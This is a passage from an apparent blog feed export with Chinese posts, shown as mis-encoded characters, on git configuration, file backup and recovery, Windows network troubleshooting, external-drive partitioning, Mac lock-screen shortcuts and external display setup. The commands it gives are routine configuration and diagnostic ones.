id="æ–¹æ³•äºŒï¼šgit-cloneè£¸ä»“åº“ï¼ˆå…‹éš†è‡ªåŠ¨å…³è”ï¼‰ï¼Œç„¶ååœ¨è£¸ä»“åº“ä¸­æ·»åŠ ä»£ç æ¨é€å³å¯"><a href="#æ–¹æ³•äºŒï¼šgit-cloneè£¸ä»“åº“ï¼ˆå…‹éš†è‡ªåŠ¨å…³è”ï¼‰ï¼Œç„¶ååœ¨è£¸ä»“åº“ä¸­æ·»åŠ ä»£ç æ¨é€å³å¯" class="headerlink" title="æ–¹æ³•äºŒï¼šgit cloneè£¸ä»“åº“ï¼ˆå…‹éš†è‡ªåŠ¨å…³è”ï¼‰ï¼Œç„¶ååœ¨è£¸ä»“åº“ä¸­æ·»åŠ ä»£ç æ¨é€å³å¯"></a>æ–¹æ³•äºŒï¼šgit cloneè£¸ä»“åº“ï¼ˆå…‹éš†è‡ªåŠ¨å…³è”ï¼‰ï¼Œç„¶ååœ¨è£¸ä»“åº“ä¸­æ·»åŠ ä»£ç æ¨é€å³å¯</h3><hr><h1 id="å…­ã€gitçš„é…ç½®"><a href="#å…­ã€gitçš„é…ç½®" class="headerlink" title="å…­ã€gitçš„é…ç½®"></a>å…­ã€gitçš„é…ç½®</h1><p>è®¾ç½®ç”¨æˆ·åä¸é‚®ä»¶åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &quot;John Doe&quot;</span><br><span class="line">$ git config --global user.email johndoe@example.com</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹é…ç½®ä¿¡æ¯<br><code>git config --list</code><br>gitåˆ«åè®¾ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global alias.co checkout</span><br><span class="line">$ git config --global alias.br branch</span><br><span class="line">$ git config --global alias.ci commit</span><br><span class="line">$ git config --global alias.st status</span><br><span class="line">$ git config --global alias.unstage &apos;reset HEAD --&apos;</span><br><span class="line">$ git config --global alias.last &apos;log -1 HEAD&apos;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> å¤‡ä»½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶çš„æ¢å¤</title>
      <link href="/post/recovery-of-the-file/"/>
      <url>/post/recovery-of-the-file/</url>
      
        <content type="html"><![CDATA[<p>ç›¸ä¿¡å¤§å®¶éƒ½ä¼šæœ‰ä¸¢å¤±æ–‡ä»¶çš„ç»å†ï¼Œæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±æ¥è°ˆè°ˆåœ¨å“ªé‡Œèƒ½å¤Ÿä¹°åˆ°â€åæ‚”è¯â€ã€‚</p><a id="more"></a><h3 id="æ–¹æ³•ä¸€-ä½¿ç”¨å…·æœ‰å®šæ—¶å¤‡ä»½åŠŸèƒ½çš„ç§»åŠ¨ç¡¬ç›˜"><a href="#æ–¹æ³•ä¸€-ä½¿ç”¨å…·æœ‰å®šæ—¶å¤‡ä»½åŠŸèƒ½çš„ç§»åŠ¨ç¡¬ç›˜" class="headerlink" title="æ–¹æ³•ä¸€ ä½¿ç”¨å…·æœ‰å®šæ—¶å¤‡ä»½åŠŸèƒ½çš„ç§»åŠ¨ç¡¬ç›˜"></a>æ–¹æ³•ä¸€ ä½¿ç”¨å…·æœ‰å®šæ—¶å¤‡ä»½åŠŸèƒ½çš„ç§»åŠ¨ç¡¬ç›˜</h3><p>æ¯”å¦‚æˆ‘çš„WD My Passport Ultraå°±æœ‰å®šæ—¶å¤‡ä»½çš„åŠŸèƒ½ï¼Œè€Œä¸”å¯ä»¥å¯¹ç¡¬ç›˜è¿›è¡ŒåŠ å¯†ï¼Œä»è€Œä¿è¯æ•°æ®çš„å®‰å…¨</p><h3 id="æ–¹æ³•äºŒ-ä½¿ç”¨Windowsçš„å¤‡ä»½åŠŸèƒ½"><a href="#æ–¹æ³•äºŒ-ä½¿ç”¨Windowsçš„å¤‡ä»½åŠŸèƒ½" class="headerlink" title="æ–¹æ³•äºŒ ä½¿ç”¨Windowsçš„å¤‡ä»½åŠŸèƒ½"></a>æ–¹æ³•äºŒ ä½¿ç”¨Windowsçš„å¤‡ä»½åŠŸèƒ½</h3><p>åœ¨æ§åˆ¶é¢æ¿ä¸­è¿›è¡Œè®¾ç½®å¤‡ä»½åŠŸèƒ½ï¼Œå¥½æƒ³å¾ˆå°‘äººä½¿ç”¨å•Š</p><h3 id="æ–¹æ³•ä¸‰-åœ¨Macä¸‹ä½¿ç”¨Time-Machine"><a href="#æ–¹æ³•ä¸‰-åœ¨Macä¸‹ä½¿ç”¨Time-Machine" class="headerlink" title="æ–¹æ³•ä¸‰ åœ¨Macä¸‹ä½¿ç”¨Time Machine"></a>æ–¹æ³•ä¸‰ åœ¨Macä¸‹ä½¿ç”¨Time Machine</h3><p>Macä¸‹çš„Time Machineæ˜¯ä¸€æ¬¾éå¸¸å¥½ç”¨çš„å¤‡ä»½å·¥å…·ï¼Œä¸è¿‡æˆ‘ä»¬éœ€è¦è®¾ç½®å¥½å¤‡ä»½å“ªäº›æ–‡ä»¶ï¼Œè¿™æ ·æ‰èƒ½åœ¨åæ‚”çš„æ—¶å€™æŒ½æ•‘æˆ‘ä»¬</p><h3 id="æ–¹æ³•å››-ä½¿ç”¨Macè‡ªå¸¦çš„æ–‡æœ¬ç¼–è¾‘å·¥å…·"><a href="#æ–¹æ³•å››-ä½¿ç”¨Macè‡ªå¸¦çš„æ–‡æœ¬ç¼–è¾‘å·¥å…·" class="headerlink" title="æ–¹æ³•å›› ä½¿ç”¨Macè‡ªå¸¦çš„æ–‡æœ¬ç¼–è¾‘å·¥å…·"></a>æ–¹æ³•å›› ä½¿ç”¨Macè‡ªå¸¦çš„æ–‡æœ¬ç¼–è¾‘å·¥å…·</h3><p>è¿™ä¸ªå·¥å…·æˆ‘ä¸ªäººè§‰å¾—ä¸æ˜¯å¾ˆå¥½ç”¨ï¼Œä½†å®ƒéšè—äº†ä¸€ä¸ªååˆ†å®ç”¨çš„åŠŸèƒ½â€”â€”æ¢å¤è¢«ä¿®æ”¹çš„æ–‡ä»¶ã€‚<br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0r98tsm2j30dw092q4f.jpg" alt="æ¢å¤æ–‡ä»¶"></p><p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0r9tqzogj31hc0u0ted.jpg" alt="æ–‡ç¨¿å†å²è®°å½•"></p><h3 id="æ–¹æ³•äº”-ä½¿ç”¨git"><a href="#æ–¹æ³•äº”-ä½¿ç”¨git" class="headerlink" title="æ–¹æ³•äº” ä½¿ç”¨git"></a>æ–¹æ³•äº” ä½¿ç”¨git</h3><p>gitä½œä¸ºå¦‚ä»Šæœ€ä¸ºæµè¡Œçš„ç‰ˆæœ¬ç®¡ç†å·¥å…·ï¼Œè¿™åº”è¯¥æ˜¯è¿™ä¸ªä¸–ç•Œä¸Šæœ€å¥½çš„å¤‡ä»½ç®¡ç†å·¥å…·äº†ï¼Œå½“ä½ ä¸¢è¿‡ä¸€æ¬¡ä»£ç æˆ–æŠŠä»£ç æçš„å¾ˆä¹±çš„æ—¶å€™å°±çŸ¥é“å®ƒæœ‰å¤šä¹ˆé‡è¦äº†ã€‚ä¸è¿‡è¿™ä¸ªå·¥å…·å¯¹äºæ™®é€šç”¨æˆ·æœ‰ä¸€å®šçš„å­¦ä¹ æˆæœ¬ï¼Œä½†å¦‚æœä¸€ä¸ªç¨‹åºå‘˜è¯´ä½ ä¸ä¼šgité‚£å°±è¦é¢å£äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨ </tag>
            
            <tag> å¤‡ä»½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså¸¸è§ç½‘ç»œæ•…éšœåŠè§£å†³åŠæ³•</title>
      <link href="/post/network-diagnose/"/>
      <url>/post/network-diagnose/</url>
      
        <content type="html"><![CDATA[<p>æ—¥å¸¸ç”Ÿæ´»ä¸­ï¼Œæˆ‘ä»¬æ€»æ˜¯ä¼šåœ¨Windowsä¸­é‡åˆ°è«åå…¶å¦™å…¶å¦™çš„ç½‘ç»œé—®é¢˜ï¼Œä»Šå¤©ï¼Œåšä¸»å°±è‡ªå·±é‡åˆ°çš„ç½‘ç»œé—®é¢˜åŠè§£å†³åŠæ³•ä¸å„ä½åˆ†äº«ä¸€ä¸‹ã€‚</p><a id="more"></a><p>å¦‚æœç”µè„‘ä¸èƒ½æ­£å¸¸ä¸Šç½‘ï¼Œè¯·æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œå°è¯•ä¿®å¤ï¼š</p><ol><li><p>ç½‘ç»œå›¾æ ‡æœ‰é»„è‰²æ„Ÿå¹å·</p><p>è§£å†³åŠæ³•ï¼šå‘½ä»¤è¡Œ(Windows+R)è¿è¡Œå‘½ä»¤â€œnetsh winsock reset â€åé‡å¯å³å¯ã€‚</p></li><li><p>ç¬”è®°æœ¬çš„WiFiç‰©ç†å¼€å…³æ˜¯å¦æ‰“å¼€</p><p>è§£å†³åŠæ³•ï¼šæ‰¾åˆ°WiFiå¼€å…³å¹¶æ‰“å¼€</p></li><li><p>åŠ¨æ€IPæˆ–é™æ€IPæ˜¯å¦è®¾ç½®æ­£ç¡®<br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0r5xwtz3j30cv0g0jsk.jpg" alt=""></p><p> è§£å†³åŠæ³•ï¼šæ ¹æ®è‡ªå·±çš„ç½‘ç»œæƒ…å†µæ­£ç¡®è®¾ç½®å›¾ç¤ºé¡µé¢ï¼Œé€šå¸¸å®¶ç”¨è·¯ç”±å™¨ç¯å¢ƒä¿æŒå›¾ç¤ºè®¾ç½®å³å¯ã€‚</p></li><li><p>WLANæœåŠ¡æ˜¯å¦å¯ç”¨<br> <img src="https://tva1.sinaimg.cn/large/0082zybply1gc0r69d1m5j30lz0c0n0l.jpg" alt=""></p><p> è§£å†³åŠæ³•ï¼šæ‰“å¼€è®¡ç®—æœºç®¡ç†ï¼ŒæŸ¥çœ‹WLANæœåŠ¡çŠ¶æ€ï¼Œæœªå¯ç”¨åˆ™è®¾ç½®ä¸ºâ€œè‡ªåŠ¨â€</p></li><li><p>ç½‘ç»œè®¾å¤‡é©±åŠ¨å™¨æœ‰é»„è‰²æ„Ÿå¹å·</p><p>è§£å†³åŠæ³•ï¼šä½¿ç”¨â€œé©±åŠ¨ç²¾çµâ€æˆ–â€œé©±åŠ¨äººç”Ÿâ€ç­‰å·¥å…·å°è¯•ä¿®å¤é©±åŠ¨</p></li><li><p>æ˜¯å¦å¯ç”¨äº†ä¸€ä¸ªæ— æ•ˆçš„ä»£ç†</p><p>è§£å†³åŠæ³•ï¼šé‡æ–°æ›´æ¢æœ‰æ•ˆä»£ç†æˆ–ä¸ä½¿ç”¨ä»£ç†</p></li><li><p>èƒ½æ­£å¸¸ä½¿ç”¨QQï¼Œä½†æ— æ³•æ‰“å¼€ç½‘é¡µ</p><p>è§£å†³åŠæ³•ï¼šè¯·å°è¯•è®¾ç½®å›¾ä¸€ä¸­çš„DNSä¸º114.114.114.114å’Œ114.114.115.115åé‡æ–°å°è¯•</p></li></ol><hr><p>å¦é™„ä¸€äº›è¯Šæ–­ç½‘ç»œçŠ¶æ€çš„å‘½ä»¤</p><ol><li>ping 127.0.0.1       æ£€æŸ¥tcp/ipåè®®æ˜¯å¦æ­£å¸¸</li><li>ping æœ¬æœºip    æ£€æŸ¥ç½‘å¡</li><li>ping ç½‘å…³åœ°å€     æ£€æŸ¥å’Œç½‘å…³çš„è¿æ¥æ€§</li><li>nslookupå‘½ä»¤å¯ç”¨äºæŸ¥çœ‹DNSæ˜¯å¦æ­£å¸¸</li><li>pingè¿œç¨‹ç½‘ç«™æŸ¥çœ‹ç½‘ç»œè¿é€šæ€§</li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç§»åŠ¨ç¡¬ç›˜çš„åˆ†åŒº</title>
      <link href="/post/partition/"/>
      <url>/post/partition/</url>
      
        <content type="html"><![CDATA[<p>æˆ‘ä»¬åˆšæ‹¿åˆ°ä¸€ä¸ªç§»åŠ¨ç¡¬ç›˜çš„æ—¶å€™ï¼Œé€šå¸¸éƒ½æ˜¯å°†å…¶æ ¹æ®æˆ‘ä»¬çš„éœ€è¦åˆ’åˆ†ä¸ºå¤šä¸ªåˆ†åŒºï¼Œé‚£é¦–å…ˆè¦äº†è§£ä¸€ä¸‹å„ç§æ ¼å¼çš„ä¼˜ç¼ºç‚¹åŠé€‚ç”¨åœºæ™¯ï¼š</p><a id="more"></a><h4 id="å„ç§æ ¼å¼å¯¹æ¯”"><a href="#å„ç§æ ¼å¼å¯¹æ¯”" class="headerlink" title="å„ç§æ ¼å¼å¯¹æ¯”"></a>å„ç§æ ¼å¼å¯¹æ¯”</h4><table><thead><tr><th align="center">æ ¼å¼</th><th align="center">ä¼˜ç‚¹</th><th align="center">ç¼ºç‚¹</th></tr></thead><tbody><tr><td align="center">FAT32</td><td align="center">å…¨å¹³å°æ”¯æŒ</td><td align="center">ä¸æ”¯æŒå•ä¸ªæ–‡ä»¶å¤§äº4Gçš„ç§»åŠ¨</td></tr><tr><td align="center">NTFS</td><td align="center">Windowså¹³å°ä¸‹æœ€ä½³</td><td align="center">Macå¹³å°ä¸‹å¯è¯»ä¸å¯å†™ï¼ˆå¯è´­ä¹°Paragon NTFS for Macå†™å…¥æ•°æ®ï¼‰</td></tr><tr><td align="center">exFAT</td><td align="center">å…¨å¹³å°æ”¯æŒï¼Œé€‚åˆå°æ–‡ä»¶çš„å­˜å‚¨ï¼ŒUç›˜å¸¸ç”¨æ ¼å¼</td><td align="center">æ®æŸ¥åœ¨æŸäº›æƒ…å†µä¸‹å®¹æ˜“ä¸¢å¤±æ•°æ®</td></tr><tr><td align="center">HFS+ï¼ˆæ—¥å¿—å¼ï¼‰</td><td align="center">Macä¸‹æœ€ä½³ï¼ŒTimeMachineè¦æ±‚çš„æ ¼å¼</td><td align="center">Windowsä¸‹ä¸å¯è¯»ä¸å¯å†™</td></tr><tr><td align="center">ext4</td><td align="center">Linuxä¸‹æœ€ä½³ï¼Œå¯è¯»å†™NTFSå’ŒHFS+</td><td align="center">æš‚æœªå‘ç°</td></tr><tr><td align="center">è¡¨æ ¼æ•°æ®æ¥æºï¼š<a href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%AF%B9%E6%AF%94" target="_blank" rel="noopener">æ–‡ä»¶ç³»ç»Ÿå¯¹æ¯”</a></td><td align="center"></td><td align="center"></td></tr></tbody></table><h4 id="å®é™…åˆ†åŒºä¸¾ä¾‹"><a href="#å®é™…åˆ†åŒºä¸¾ä¾‹" class="headerlink" title="å®é™…åˆ†åŒºä¸¾ä¾‹"></a>å®é™…åˆ†åŒºä¸¾ä¾‹</h4><p>ä»¥åšä¸»çš„æƒ…å†µä¸ºä¾‹ï¼Œæ‰‹ä¸Šæœ‰ä¸€ä¸ªWD My Passport Ultraçš„1Tç§»åŠ¨ç¡¬ç›˜ï¼Œé€šå¸¸åœ¨Macä¸‹ä½¿ç”¨ï¼Œè€Œä¸”è¦ç”¨æ­¤ç›˜ä½œTime Machineï¼Œå…¶æ¬¡å°±æ˜¯Windowså¹³å°çš„ä½¿ç”¨ï¼Œå› æ­¤éœ€è¦åˆ’åˆ†3ä¸ªåˆ†åŒºã€‚Macåˆ†åŒºå’ŒTime Machineè‡ªç„¶æ˜¯æ—¥å¿—å¼ï¼ŒWindowså¹³å°æ ¼å¼å¦‚æœæ˜¯FAT32è‡ªç„¶æ˜¯å¾ˆæ–¹ä¾¿ï¼Œä½†ç»å¸¸ä¼šç§»åŠ¨4Gä»¥ä¸Šçš„æ–‡ä»¶ï¼ŒexFATåˆå¯èƒ½ä¼šä¸¢å¤±æ•°æ®ï¼Œå› æ­¤å†³å®šä½¿ç”¨NTFSæ ¼å¼ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œåœ¨Windowså¹³å°ä¸‹ä½¿ç”¨ç£ç›˜ç²¾çµï¼ˆDiskGeniusï¼‰å°†ç¡¬ç›˜åˆ†ä¸º1ä¸ª600Gçš„FAT32æ ¼å¼å’Œ1ä¸ª400Gçš„NTFSæ ¼å¼ï¼Œç„¶ååœ¨Macè‡ªå¸¦çš„ç£ç›˜å·¥å…·ä¸‹å°†FAT32æ ¼å¼çš„600Gå†åˆ’åˆ†ä¸º400Gå’Œ200Gçš„æ—¥å¿—å¼ï¼Œè¿™æ ·å°±èƒ½å¤Ÿæ»¡è¶³æˆ‘çš„æ—¥å¸¸ç”Ÿæ´»éœ€è¦äº†ï¼Œè€Œä¸”ç¨³å®šæ€§å’Œå…¼å®¹æ€§éƒ½å¾ˆä¸é”™ã€‚<br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0r6uj7qdj30hi0a20tu.jpg" alt="ç¡¬ç›˜åˆ†åŒº"></p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åˆ†åŒº </tag>
            
            <tag> ç£ç›˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Macè®¾ç½®å¿«é€Ÿä¼‘çœ å’Œé”å±</title>
      <link href="/post/mac-sleep-and-lock-screen/"/>
      <url>/post/mac-sleep-and-lock-screen/</url>
      
        <content type="html"><![CDATA[<p>ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨Windowsæ“ä½œç³»ç»Ÿä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>Windows+L</code>é”®æ¥é”å®šå±å¹•ï¼Œè½¬åˆ°Macå¹³å°ä¸‹ä¸€æ®µæ—¶é—´åï¼Œæˆ‘å‘ç°Macä¼¼ä¹å¹¶æ²¡æœ‰è¿™æ ·çš„æŒ‰é”®ï¼Œä¸€ç•ªæœç´¢åï¼Œå‘ç°äº†ä»¥ä¸‹å‡ ç§æ–¹æ³•æ¥å®ç°å¿«é€Ÿé”å±æˆ–ä¼‘çœ ã€‚</p><a id="more"></a><h3 id="æ–¹å¼ä¸€-åˆç›–"><a href="#æ–¹å¼ä¸€-åˆç›–" class="headerlink" title="æ–¹å¼ä¸€ åˆç›–"></a>æ–¹å¼ä¸€ åˆç›–</h3><p>ä¼—æ‰€å‘¨çŸ¥ï¼ŒMacç³»ç»Ÿéå¸¸çš„ç¨³å®šï¼Œæˆ‘ä»¬ç”šè‡³å¯ä»¥åŠå¹´ä¸å…³æœºï¼Œå³åˆå³èµ°ï¼Œå³å¼€å³ç”¨ï¼Œéå¸¸æ–¹ä¾¿ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç›’ç›–çš„æ–¹å¼æ¥ä½¿ç³»ç»Ÿè¿›å…¥ä¼‘çœ çš„çŠ¶æ€ï¼Œä½†è¿™ç§æ–¹å¼ä¸å¤Ÿå®‰å…¨ï¼Œå¦‚æœä½ åˆšåˆšç›’ç›–èµ·èº«ç¦»å»ï¼Œå¦ä¸€ä¸ªäººé©¬ä¸Šå°±è¿‡æ¥æ‰“å¼€ä½ çš„ç”µè„‘ï¼Œä»–ä»ç„¶å¯ä»¥ä¸éœ€è¦è¾“å…¥å¯†ç è€Œç›´æ¥è¿›å…¥ç³»ç»Ÿã€‚åœ¨ä¼‘çœ çŠ¶æ€ä¸‹ï¼Œç³»ç»Ÿä¼šæ–­å¼€ç½‘ç»œï¼Œä¿å­˜æ­£åœ¨è¿è¡Œçš„ç¨‹åºçŠ¶æ€ï¼Œç›´è‡³ç³»ç»Ÿè¢«å”¤é†’ã€‚</p><h3 id="æ–¹å¼äºŒ-è§¦å‘è§’"><a href="#æ–¹å¼äºŒ-è§¦å‘è§’" class="headerlink" title="æ–¹å¼äºŒ è§¦å‘è§’"></a>æ–¹å¼äºŒ è§¦å‘è§’</h3><p>æ‰“å¼€â€ç³»ç»Ÿåå¥½è®¾ç½®â€ï¼Œç„¶åç‚¹å‡»å±å¹•ä¿æŠ¤ç¨‹åºä¸‹çš„è§¦å‘è§’</p><p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0qsaggnhj30ih0fhwg9.jpg" alt="è§¦å‘è§’è®¾ç½®"></p><p>è¿™æ ·ï¼Œå½“é¼ æ ‡ç§»åŠ¨åˆ°æ˜¾ç¤ºå™¨çš„å³ä¸‹è§’æ—¶ï¼Œç³»ç»Ÿå°±ä¼šè¿›å…¥ä¼‘çœ çŠ¶æ€ã€‚å¦‚æœä½ æœ‰å¤–æ¥æ˜¾ç¤ºå™¨ï¼Œæ— è®ºä½ åœ¨å“ªä¸ªæ˜¾ç¤ºå™¨ä¸‹è¿›è¡Œæ­¤æ“ä½œéƒ½æ˜¯å¯ä»¥ç”Ÿæ•ˆçš„ã€‚</p><p>è¿™ç§æ–¹å¼ä¸‹ï¼Œå®è´¨ä¸æ–¹å¼ä¸€ç›¸åŒï¼Œåªä¸è¿‡ä¸éœ€è¦åˆç›–è€Œå·²ï¼Œå› æ­¤åŒæ ·ä¸å¤Ÿå®‰å…¨ã€‚</p><h3 id="æ–¹å¼ä¸‰-Alfredé”å®šè®¡ç®—æœº"><a href="#æ–¹å¼ä¸‰-Alfredé”å®šè®¡ç®—æœº" class="headerlink" title="æ–¹å¼ä¸‰ Alfredé”å®šè®¡ç®—æœº"></a>æ–¹å¼ä¸‰ Alfredé”å®šè®¡ç®—æœº</h3><p>ç”±äºæ–¹å¼ä¸€ã€äºŒå¯¹äºæœ‰é‡è¦æ•°æ®çš„äººæ¥è¯´ä»ç„¶ä¸å¤Ÿå®‰å…¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ç§èƒ½å¤ŸåƒWindows+Lé‚£æ ·çš„å¿«é€Ÿé”å±æ–¹å¼æ¥ä¿è¯æ•°æ®å®‰å…¨ã€‚<br>é¦–å…ˆæ¥ç®€å•ä»‹ç»ä»¥ä¸‹Alfredï¼Œè¿™æ˜¯ä¸€ä¸ªæå‡Macæ•ˆç‡çš„ç¥å™¨ï¼Œå¯ä»¥çœ‹ä½œæ˜¯ç³»ç»Ÿè‡ªå¸¦çš„Spotlightçš„å¢å¼ºç‰ˆï¼Œæˆ‘ä»¬ç»å¤§å¤šæ•°çš„æ“ä½œéƒ½å¯ä»¥åœ¨å‘¼å‡ºAlfredåé©¬ä¸Šæ‰§è¡Œï¼Œå¦‚æŸ¥å•è¯ï¼ˆä»˜è´¹ç‰ˆï¼‰ã€ç®—æœ¯ã€æ‰“å¼€è½¯ä»¶ã€ä½¿ç”¨æœç´¢å¼•æ“æœç´¢ï¼ˆè‡ªå®šä¹‰æœç´¢å¼•æ“éœ€ä»˜è´¹ï¼‰ç­‰ã€‚</p><p>å½“ç„¶äº†ï¼ŒAlfredä¹Ÿå…·å¤‡äº†Spotlightæ‰€æ²¡æœ‰çš„é”å±åŠŸèƒ½ï¼Œæˆ‘ä»¬ç›´æ¥å‘¼å‡ºAlfredåè¾“å…¥â€lockâ€å›è½¦å³å¯é”å®šå±å¹•ï¼Œä»è€Œä¿è¯æˆ‘ä»¬çš„æ•°æ®å®‰å…¨ã€‚è€Œä¸”è¿™ä¸€åŠŸèƒ½åœ¨å…è´¹ç‰ˆæœ¬ä¸­å³å¯ä½¿ç”¨ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0qt0gjuhj30fu03qdg2.jpg" alt="Alfred"></p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é”å± </tag>
            
            <tag> å®‰å…¨ </tag>
            
            <tag> ä¼‘çœ  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤–æ¥æ˜¾ç¤ºå™¨çš„è®¾ç½®</title>
      <link href="/post/external-display-tutorial/"/>
      <url>/post/external-display-tutorial/</url>
      
        <content type="html"><![CDATA[<p>å°å±å¹•çš„MacBook/MacBook Proæ”¾åœ¨æ¡Œä¸Šé•¿æ—¶é—´ä½¿ç”¨ï¼Œçœ¼ç›æ¯”è¾ƒç´¯ï¼Œè€Œä¸”ï¼Œé•¿æ—¶é—´ä½å¤´çœ‹å±å¹•ï¼Œæ˜“å¾—é¢ˆæ¤ç—…ï¼Œç»å¯¹æœ‰æŸå¥åº·ã€‚é…ä¸€å°å¤§å±å¹•çš„å¤–ç½®æ˜¾ç¤ºå™¨ä¸å¤±ä¸ºä¸¤å…¨å…¶ç¾çš„å¥½åŠæ³•ã€‚</p><a id="more"></a><p>é¦–å…ˆï¼Œå¾—ä¹°ä¸€å°ä¸­æ„çš„å¤§å±å¹•LEDæ˜¾ç¤ºå™¨ï¼ˆåºŸè¯undefined ï¼‰ã€‚ä¸€èˆ¬22~27å‹çš„ã€å…¨é«˜æ¸…çš„å°±æ¯”è¾ƒå¥½ã€‚å¦‚æœä½ ç»æµæ¡ä»¶å¥½ï¼Œå½“ç„¶å¯ä»¥ä¹°å°ºå¯¸æ›´å¤§çš„ã€åˆ†è¾¨ç‡æ›´é«˜çš„Appleå¤§å±æ˜¾ç¤ºå™¨ã€‚</p><p>å…¶æ¬¡ï¼Œæ‘†æ”¾å¥½æœ¬æœ¬å’Œå¤–ç½®æ˜¾ç¤ºå™¨çš„ä½ç½®ï¼Œæ ¹æ®æ”¯æŒçš„æ¥å£æƒ…å†µï¼Œå°†å¤§å±å¹•LEDæ˜¾ç¤ºå™¨ä¸MacBook Air/MacBook Proç”¨ThunderBoltæˆ–HDMIçº¿è¿æ¥åï¼Œå¼€æœºã€‚</p><p>æ¥ç€ï¼Œè¿›è¡Œä¸€äº›å¿…è¦çš„è®¾ç½®ã€‚ä»¥æ˜¾ç¤ºå™¨è®¾ä¸ºâ€œæ‰©å±•â€ä¸ºä¾‹ï¼š</p><ol><li><p>æ‰“å¼€â€œç³»ç»Ÿåå¥½è®¾ç½®-æ˜¾ç¤ºå™¨â€ï¼Œå‡ºç°ä¸¤ä¸ªæ˜¾ç¤ºå™¨çš„è®¾ç½®çª—å£ã€‚å¯ä»¥å°†è®¾ç½®çª—å£æ‹–åˆ°ä»»ä¸€æ˜¾ç¤ºå±ä¸Šã€‚å¦‚æœä¸èƒ½æ­£ç¡®æ˜¾ç¤ºå¤–ç½®æ˜¾ç¤ºå™¨ä¿¡æ¯ï¼Œå°±ç‚¹å‡»â€œæ£€æµ‹æ˜¾ç¤ºå™¨â€ã€‚</p></li><li><p>å¯¹æ¯ä¸€å—æ˜¾ç¤ºå±ï¼Œè®¾ç½®ç›¸åº”çš„æœ€åˆé€‚çš„åˆ†è¾¨ç‡ã€‚<br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0rhwqcutj31140dudi2.jpg" alt="å¤–æ¥æ˜¾ç¤ºå™¨çš„è®¾ç½®"></p></li><li><p>ç‚¹å‡»â€œæ’åˆ—â€ï¼Œå°†æ˜¾ç¤ºå™¨å›¾å½¢æ‹–åˆ°è·Ÿå®é™…ä½ç½®å¯¹åº”çš„å·¦/å³ä½ç½®ã€‚è¿™æ ·ï¼Œå½“ä½ å°†å¤–ç½®æ˜¾ç¤ºå™¨è®¾ç½®ä¸ºé»˜è®¤çš„â€œæ‰©å±•â€æ¡Œé¢æ—¶ï¼Œå°±ä¸è‡³äºå‘ç”Ÿè¦å°†é¼ æ ‡åå‘ç§»åŠ¨åˆ°å¦ä¸€å—å±å¹•ä¸Šçš„å°´å°¬ã€‚<br><img src="https://tva1.sinaimg.cn/large/0082zybply1gc0rhcgoj9j30if0dwq3v.jpg" alt="å¤–æ¥æ˜¾ç¤ºå™¨çš„æ’åˆ—è®¾ç½®"></p></li><li><p>å¦‚æœä½ è¦å°†å¤–ç½®æ˜¾ç¤ºå™¨ä½œä¸ºä¸»å±å¹•ï¼Œè¿˜å¿…é¡»è¿›è¡Œä»¥ä¸‹è®¾ç½®ï¼š<br>ï¼ˆ1ï¼‰å°†è®¾ç½®å›¾ä¸­å°å±å¹•ä¸Šé¢çš„ç™½è‰²èœå•æ æ‹–åˆ°å¤§å±å¹•å›¾æ ‡ä¸Šæ–¹ã€‚ä¸¤ä¸ªå±å¹•éƒ½ä¼šé—ªä¸€ä¸‹ï¼Œèœå•æ å°±ç§»åˆ°å¤§å±å¹•ä¸Šæ–¹ï¼Œå¤§å±å°±æ˜¯ä¸»å±å¹•äº†ã€‚<br>ï¼ˆ2ï¼‰å¦‚æœä½ 